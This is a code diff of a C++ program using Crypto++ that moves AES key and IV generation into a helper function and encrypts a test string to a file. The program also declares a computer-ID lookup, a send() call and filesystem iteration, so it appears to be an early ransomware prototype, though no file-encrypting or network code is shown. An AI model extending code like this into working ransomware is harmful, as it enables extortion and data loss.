@@ -3,14 +3,14 @@
 
 #include <boost/filesystem/operations.hpp>
 
-#include "default.h"
-#include "osrng.h"
-#include "cryptlib.h"
-#include "hex.h"
-#include "filters.h"
-#include "files.h"
-#include "aes.h"
-#include "ccm.h"
+#include <cryptopp/default.h>
+#include <cryptopp/osrng.h>
+#include <cryptopp/cryptlib.h>
+#include <cryptopp/hex.h>
+#include <cryptopp/filters.h>
+#include <cryptopp/files.h>
+#include <cryptopp/aes.h>
+#include <cryptopp/ccm.h>
 
 #ifdef _WIN32
 #	include <windows.h>
@@ -25,6 +25,12 @@ using namespace CryptoPP;
 
 #define EMPTY ""
 
+struct crypt_data {
+	byte key[AES::DEFAULT_KEYLENGTH];
+	byte iv[AES::BLOCKSIZE];
+};
+
+crypt_data* generatekey();
 void iterate(const path& parent);
 void process(const path& path);
 string getid();
@@ -36,26 +42,20 @@ int main(int argc, char* argv[]) {
 
 	cout << "Computer ID: " << getid() << endl;
 
+	crypt_data* d = generatekey();
+
 	send();
-
-	AutoSeededRandomPool prng;
-
-	byte key[AES::DEFAULT_KEYLENGTH];
-	prng.GenerateBlock(key, sizeof(key));
-
-	byte iv[AES::BLOCKSIZE];
-	prng.GenerateBlock(iv, sizeof(iv));
 
 	string cipher;
 
 	// Print key and initialization vector
 	string skey;
-	StringSource(key, sizeof(key), true, new HexEncoder(new StringSink(skey)));
+	StringSource(d->key, sizeof(d->key), true, new HexEncoder(new StringSink(skey)));
 	cout << "Key:\t\t" << skey << endl;
 	skey.clear();
 
 	string siv;
-	StringSource(iv, sizeof(iv), true, new HexEncoder(new StringSink(siv)));
+	StringSource(d->iv, sizeof(d->iv), true, new HexEncoder(new StringSink(siv)));
 	cout << "IV:\t\t" << siv << endl;
 	siv.clear();
 
@@ -64,7 +64,7 @@ int main(int argc, char* argv[]) {
 	cout << "Plaintext:\t" << plain << endl;
 
 	CBC_Mode<AES>::Encryption e;
-	e.SetKeyWithIV(key, sizeof(key), iv);
+	e.SetKeyWithIV(d->key, sizeof(d->key), d->iv);
 
 	StringSource s(plain, true, new StreamTransformationFilter(e, new FileSink("./ciphertext")));
 
@@ -79,7 +79,19 @@ int main(int argc, char* argv[]) {
 	string ciphertext;
 	StringSource(cipher, true, new HexEncoder(new StringSink(ciphertext)));
 	cout << "Ciphertext:\t" << ciphertext << endl;
+
 	return 0;
+}
+
+crypt_data* generatekey() {
+	crypt_data* d = new crypt_data;
+
+	AutoSeededRandomPool prng;
+
+	prng.GenerateBlock(d->key, sizeof(d->key));
+	prng.GenerateBlock(d->iv, sizeof(d->iv));
+
+	return d;
 }
 
 void iterate(const path& parent) {
